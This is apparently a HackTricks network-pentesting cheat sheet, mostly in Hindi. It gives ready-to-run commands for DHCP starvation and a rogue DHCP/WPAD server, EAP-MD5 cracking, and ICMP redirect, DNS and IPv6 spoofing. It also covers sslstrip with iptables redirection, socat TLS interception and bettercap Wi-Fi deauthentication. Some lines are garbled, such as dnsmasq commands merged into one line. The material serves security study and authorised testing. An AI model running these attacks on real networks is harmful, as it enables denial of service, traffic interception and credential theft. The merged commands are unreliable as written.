कॉर्पोरेट सेटिंग्स में, किसी मौजूदा VoIP डिवाइस की नकल करने के लिए आप:

- फ़ोन पर लगे MAC लेबल की जाँच कर सकते हैं।
- मॉडल जानकारी देखने के लिए फ़ोन की डिस्प्ले सेटिंग्स में जा सकते हैं।
- VoIP डिवाइस को लैपटॉप से कनेक्ट करके Wireshark का उपयोग कर CDP requests का अवलोकन कर सकते हैं।

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**दो प्रकार के DoS** DHCP servers के खिलाफ किए जा सकते हैं। पहला तरीका है **पर्याप्त नकली hosts बनाकर सभी संभव IP addresses का उपयोग करना**.\
यह हमला केवल तब काम करेगा जब आप DHCP server की responses देख सकें और protocol पूरा कर सकें (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). उदाहरण के लिए, यह **Wifi networks में संभव नहीं है**।

DHCP DoS करने का एक और तरीका है **DHCP-RELEASE packet को भेजना जिसमें source के रूप में हर संभव IP इस्तेमाल किया गया हो**। इसके बाद server सोच जाएगा कि हर किसी ने IP का उपयोग समाप्त कर लिया है।
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

आप उल्लेखित DoS attacks का उपयोग clients को environment के भीतर नए leases प्राप्त करने के लिए मजबूर करने और legitimate servers को exhaust करने के लिए कर सकते हैं ताकि वे unresponsive हो जाएँ। जब legitimate पुन: कनेक्ट करने की कोशिश करते हैं, **आप अगले हमले में बताए गए malicious values सर्व कर सकते हैं**।

#### Set malicious values

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. यह network attacks के लिए उपयोगी है, जैसे कि HTTP traffic और credentials को capture करना, ट्रैफ़िक को एक malicious server पर redirect करके। हालांकि, rogue gateway सेट करना कम प्रभावी है क्योंकि यह केवल client से outbound traffic capture करने में सक्षम बनाता है, जिससे real gateway के responses मिस हो जाते हैं। इसके बजाय, एक अधिक प्रभावी हमला करने के लिए rogue DNS या WPAD server सेट करने की सिफारिश की जाती है।

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
  - अपने मशीन के IP को gateway के रूप में घोषित करने के लिए `-i 10.0.0.100` का उपयोग करें।
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
  - वैकल्पिक रूप से, लोकल DNS domain नाम सेट करने के लिए `-d example.org` का उपयोग करें।
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
  - वास्तविक router/gateway का IP निर्दिष्ट करने के लिए `-r 10.0.0.1` का उपयोग करें।
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
  - अपने द्वारा नियंत्रित rogue DNS server का IP सेट करने के लिए `-p 10.0.0.100` का उपयोग करें।
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
  - विकल्पानुसार, सेकंडरी DNS server IP सेट करने के लिए `-s 10.0.0.1` का उपयोग करें।
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
  - लोकल नेटवर्क का netmask परिभाषित करने के लिए `-n 255.255.255.0` का उपयोग करें।
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
  - किसी विशिष्ट नेटवर्क interface पर DHCP traffic सुनने के लिए `-I eth1` का उपयोग करें।
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
  - WPAD configuration के लिए address सेट करने के लिए `-w “http://10.0.0.100/wpad.dat”` का उपयोग करें, जो web traffic interception में मदद करेगा।
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
  - default gateway IP को spoof करने के लिए `-S` शामिल करें।
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.
  - server को सभी DHCP requests का उत्तर देने के लिए `-R` शामिल करें, पर ध्यान रखें कि यह noisy होता है और detect किया जा सकता है।

By correctly using these options, a rogue DHCP server can be established to intercept network traffic effectively.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP हमले**

यहाँ कुछ हमले की रणनीतियाँ दी गई हैं जो 802.1X के क्रियान्वयन के खिलाफ इस्तेमाल की जा सकती हैं:

- EAP के माध्यम से सक्रिय brute-force पासवर्ड क्रैकिंग
- त्रुटिपूर्ण EAP content के साथ RADIUS server पर हमला _\*\*_(exploits)
- EAP संदेश कैप्चर और ऑफलाइन पासवर्ड क्रैकिंग (EAP-MD5 और PEAP)
- TLS certificate validation को bypass करने के लिए EAP-MD5 authentication को मजबूर करना
- प्रमाणीकरण होने पर hub या इसी तरह के डिवाइस का उपयोग करके हानिकारक नेटवर्क ट्रैफिक इंजेक्ट करना

यदि हमलावर शिकार और authentication server के बीच में है, तो वह (आवश्यक होने पर) authentication protocol को EAP-MD5 तक degrade करने की कोशिश कर सकता है और authentication प्रयास को capture कर सकता है। फिर, वह इसे brute-force कर सकता है, उपयोग करके:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) हमले <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) नेटवर्क प्रोटोकॉल की एक श्रेणी है जो **एक हॉट रेडंडेंट रूटिंग सिस्टम बनाने** के लिए डिज़ाइन की गई है। FHRP के साथ, physical routers को एक single logical device में जोड़ा जा सकता है, जिससे fault tolerance बढ़ती है और load को वितरित करने में मदद मिलती है।

**Cisco Systems के इंजीनियरों ने दो FHRP प्रोटोकॉल विकसित किए हैं, GLBP और HSRP।**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP) के तीन संस्करण मौजूद हैं: RIP, RIPv2, और RIPng। RIP और RIPv2 UDP का उपयोग करके datagrams को peers को पोर्ट 520 पर भेजते हैं, जबकि RIPng IPv6 multicast के माध्यम से datagrams को UDP पोर्ट 521 पर broadcast करता है। RIPv2 में MD5 authentication का समर्थन जोड़ा गया था। दूसरी तरफ, RIPng में native authentication शामिल नहीं है; इसके बजाय यह IPv6 में विकल्प के रूप में मौजूद IPsec AH और ESP headers पर निर्भर करता है।

- **RIP and RIPv2:** संचार UDP datagrams के माध्यम से पोर्ट 520 पर किया जाता है।
- **RIPng:** IPv6 multicast के माध्यम से UDP पोर्ट 521 का उपयोग करके datagrams broadcast करता है।

ध्यान दें कि RIPv2 MD5 authentication का समर्थन करता है जबकि RIPng native authentication शामिल नहीं करता और IPv6 में IPsec AH और ESP headers पर निर्भर करता है।

### EIGRP हमले

**EIGRP (Enhanced Interior Gateway Routing Protocol)** एक dynamic routing protocol है। **यह एक distance-vector protocol है।** यदि authentication और passive interfaces को configure नहीं किया गया है, तो एक intruder EIGRP routing में हस्तक्षेप कर सकता है और routing tables को poison कर सकता है। इसके अलावा, EIGRP नेटवर्क (यानी autonomous system) flat होता है और इसमें कोई segmentation या zones नहीं होते। यदि कोई attacker कोई route inject करता है, तो संभव है कि वह route पूरे autonomous EIGRP सिस्टम में फैल जाए।

EIGRP सिस्टम पर हमला करने के लिए एक legitimate EIGRP router के साथ neighbourhood स्थापित करना आवश्यक होता है, जिससे basic reconnaissance से लेकर विभिन्न types के injections तक कई संभावनाएँ खुल जाती हैं।

[**FRRouting**](https://frrouting.org/) आपको एक virtual router implement करने की अनुमति देता है जो BGP, OSPF, EIGRP, RIP और अन्य protocols को support करता है। बस इसे attacker के system पर deploy करें और आप routing domain में एक legitimate router होने का नाटक कर सकते हैं।


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) में EIGRP (Enhanced Interior Gateway Routing Protocol) broadcasts को intercept करने की क्षमता है। यह packets को inject करने की भी अनुमति देता है, जिसे routing configurations बदलने के लिए उपयोग किया जा सकता है।

### OSPF

Open Shortest Path First (OSPF) प्रोटोकॉल में routers के बीच secure संचार सुनिश्चित करने के लिए आम तौर पर MD5 authentication का उपयोग किया जाता है। हालाँकि, यह सुरक्षा उपाय Loki और John the Ripper जैसे tools से समझौता किया जा सकता है। ये tools MD5 hashes को capture और crack करने में सक्षम हैं, जिससे authentication key उजागर हो जाती है। एक बार यह key मिल जाने पर, इसे नए routing सूचना introduce करने के लिए उपयोग किया जा सकता है। route parameters configure करने और compromised key सेट करने के लिए क्रमशः _Injection_ और _Connection_ tabs का उपयोग किया जाता है।

- **MD5 Hashes को capture और crack करना:** इसके लिए Loki और John the Ripper जैसे tools का उपयोग किया जाता है।
- **Route Parameters को configure करना:** यह _Injection_ tab के माध्यम से किया जाता है।
- **Compromised Key सेट करना:** यह key _Connection_ tab में configure की जाती है।

### अन्य सामान्य टूल और स्रोत

- [**Above**](https://github.com/c4s73r/Above): नेटवर्क ट्रैफ़िक स्कैन करने और vulnerabilities खोजने का टूल
- नेटवर्क हमलों के बारे में अधिक जानकारी आप [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet) पर पा सकते हैं।

## **Spoofing**

attacker fake DHCP responses भेजकर नेटवर्क के नए सदस्य के सभी network parameters (GW, IP, DNS) को configure कर देता है।
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

देखें [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect में एक ICMP packet type 1 code 5 भेजना शामिल है, जो संकेत देता है कि attacker किसी IP तक पहुँचने का सबसे अच्छा रास्ता है। फिर, जब victim उस IP से संपर्क करना चाहता है, तो वह packet attacker के माध्यम से भेजेगा।
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

आक्रमणकारी पीड़ित द्वारा मांगे गए कुछ (या सभी) डोमेन्स को resolve करेगा।
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**अपने DNS को dnsmasq के साथ कॉन्फ़िगर करें**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### स्थानीय गेटवे

सिस्टम और नेटवर्क के लिए अक्सर कई रास्ते मौजूद रहते हैं। स्थानीय नेटवर्क के भीतर MAC addresses की सूची बनाने के बाद, IPv4 forwarding का समर्थन करने वाले hosts की पहचान करने के लिए _gateway-finder.py_ का उपयोग करें।
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

जब DNS lookups विफल होते हैं तो लोकल होस्ट रिज़ॉल्यूशन के लिए Microsoft सिस्टम **Link-Local Multicast Name Resolution (LLMNR)** और **NetBIOS Name Service (NBT-NS)** पर निर्भर करते हैं। इसी तरह, नेटवर्क में सिस्टम खोजने के लिए **Apple Bonjour** और **Linux zero-configuration** इम्प्लीमेंटेशन **Multicast DNS (mDNS)** का उपयोग करते हैं। इन प्रोटोकॉल्स की प्रमाणीकरण-रहित प्रकृति और UDP पर ब्रॉडकास्ट संदेशों के कारण, हमलावर इन्हें उपयोग करके उपयोगकर्ताओं को दुर्भावनापूर्ण सेवाओं की ओर रिडायरेक्ट कर सकते हैं।

आप Responder का उपयोग करके उन सेवाओं की नकल कर सकते हैं जिन्हें होस्ट्स खोज रहे होते हैं और नकली उत्तर भेज सकते हैं.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ब्राउज़र्स आमतौर पर प्रॉक्सी सेटिंग्स अपने आप प्राप्त करने के लिए **Web Proxy Auto-Discovery (WPAD) protocol** का उपयोग करते हैं। इसके लिए कॉन्फ़िगरेशन विवरण सर्वर से फ़ेच किए जाते हैं, आमतौर पर ऐसे URL के माध्यम से: "http://wpad.example.org/wpad.dat"। क्लाइंट्स द्वारा इस सर्वर की खोज विभिन्न तंत्रों से हो सकती है:

- Through **DHCP**, where the discovery is facilitated by utilizing a special code 252 entry.
- By **DNS**, which involves searching for a hostname labeled _wpad_ within the local domain.
- Via **Microsoft LLMNR and NBT-NS**, which are fallback mechanisms used in cases where DNS lookups do not succeed.

Responder टूल इस प्रोटोकॉल का फायदा उठाकर **malicious WPAD server** की तरह कार्य करता है। यह DHCP, DNS, LLMNR, और NBT-NS का उपयोग करके क्लाइंट्स को गुमराह कर उन्हें इसके साथ कनेक्ट करवा देता है। To dive deeper into how services can be impersonated using Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

आप नेटवर्क में विभिन्न सेवाएँ ऑफर कर सकते हैं ताकि किसी उपयोगकर्ता को धोखा देकर कुछ **plain-text credentials** दर्ज करवाए जा सकें। **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

यह हमला ARP Spoofing के बहुत समान है लेकिन IPv6 दुनिया में। आप पीड़ित को यह भरोसा दिला सकते हैं कि GW के IPv6 पते का MAC हमलावर के MAC जैसा है।
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

कुछ OS डिफ़ॉल्ट रूप से नेटवर्क में भेजे गए RA पैकेट्स से गेटवे कॉन्फ़िगर कर लेते हैं। हमलावर को IPv6 router घोषित करने के लिए आप निम्नलिखित का उपयोग कर सकते हैं:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

डिफ़ॉल्ट रूप से कुछ OS नेटवर्क में DHCPv6 पैकेट पढ़कर DNS को कॉन्फ़िगर करने की कोशिश करते हैं। फिर, एक attacker DHCPv6 पैकेट भेजकर खुद को DNS के रूप में कॉन्फ़िगर कर सकता है। DHCP victim को एक IPv6 पता भी प्रदान कर सकता है।
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

संक्षेप में, यह attack उस स्थिति में काम करता है जब **user** किसी **HTTP** पेज को **access** करने की कोशिश करता है जो **redirecting** होकर **HTTPS** version पर जा रहा होता है। **sslStrip** एक **HTTP connection with** **client and** एक **HTTPS connection with** **server** **maintain** करेगा, इसलिए यह कनेक्शन को **plain text** में **sniff** कर सकेगा।
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy for bypassing HSTS

**अंतर** यह है कि **sslStrip+ and dns2proxy** **sslStrip** के मुकाबले उदाहरण के लिए _**www.facebook.com**_ **को** _**wwww.facebook.com**_ (ध्यान दें **अतिरिक्त** "**w**") पर **redirect** करेंगे और इस डोमेन का **पता attacker IP के रूप में** सेट कर देंगे।

इस तरह, **client** **connect** करेगा _**wwww.facebook.com**_ **(the attacker)**, लेकिन पर्दे के पीछे **sslstrip+** **maintain** करेगा **real connection** को https के माध्यम से **www.facebook.com** के साथ।

इस तकनीक का **लक्ष्य** है **HSTS से बचना** क्योंकि _**wwww**.facebook.com_ **ब्राउज़र के** **cache** में सहेजा **नहीं होगा**, इसलिए ब्राउज़र को धोखा दिया जाएगा ताकि वह **facebook authentication in HTTP** करे.\
ध्यान दें कि इस attack को करने के लिए victim को शुरू में [http://www.faceook.com](http://www.faceook.com) पर पहुँचने की कोशिश करनी होगी और न कि https. यह http पेज के अंदर लिंक बदलकर किया जा सकता है.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen in port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen पोर्ट पर

#### keys और self-signed certificate बनाएँ
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### सर्टिफिकेट का उपयोग करके सुनना
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### प्रमाणपत्र का उपयोग करके सुनें और hosts पर रीडायरेक्ट करें
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
कभी-कभी, अगर client जांचता है कि CA मान्य है, तो आप **serve a certificate of other hostname signed by a CA**.\
एक और दिलचस्प परीक्षण है, कि आप serve a c**ertificate of the requested hostname but self-signed**.

अन्य चीजें जो टेस्ट करनी चाहिए: certificate को ऐसे valid certificate से sign करने की कोशिश करना जो खुद एक valid CA न हो। या valid public key का उपयोग करना, और algorithm के रूप में diffie hellman को मजबूर करना (ऐसा algorithm जो वास्तविक private key से कुछ भी decrypt करने की आवश्यकता नहीं करता), और जब client वास्तविक private key का कोई probe (जैसे hash) अनुरोध करे, तो एक fake probe भेजना और उम्मीद करना कि client इसे नहीं जांचेगा।

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### सक्रिय डिस्कवरी नोट्स

ध्यान रखें कि जब किसी डिवाइस को UDP packet भेजा जाता है और उस पर requested पोर्ट उपलब्ध नहीं होता, तो एक ICMP (Port Unreachable) संदेश भेजा जाता है।

### **ARP discover**

ARP packets का उपयोग यह पता लगाने के लिए किया जाता है कि नेटवर्क के भीतर कौन से IP उपयोग में हैं। PC को हर संभावित IP address के लिए एक request भेजनी होती है और केवल वही respond करेंगे जो उपयोग में हैं।

### **mDNS (multicast DNS)**

Bettercap हर X ms पर एक MDNS request भेजता है जो **\_services\_.dns-sd.\_udp.local** के लिए पूछती है। जो मशीन यह packet देखती है, आमतौर पर इस request का उत्तर देती है। फिर, यह केवल उन मशीनों को खोजता है जो "services" के जवाब देती हैं।

**टूल्स**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap पोर्ट 137/UDP पर broadcast packets भेजकर नाम "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" के लिए पूछता है।

### **SSDP (Simple Service Discovery Protocol)**

Bettercap SSDP packets broadcast करके सभी प्रकार की services की खोज करता है (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap WSD packets broadcast करके services की खोज करता है (UDP Port 3702).


### Telecom / Mobile-Core (GTP) का शोषण


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## संदर्भ

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
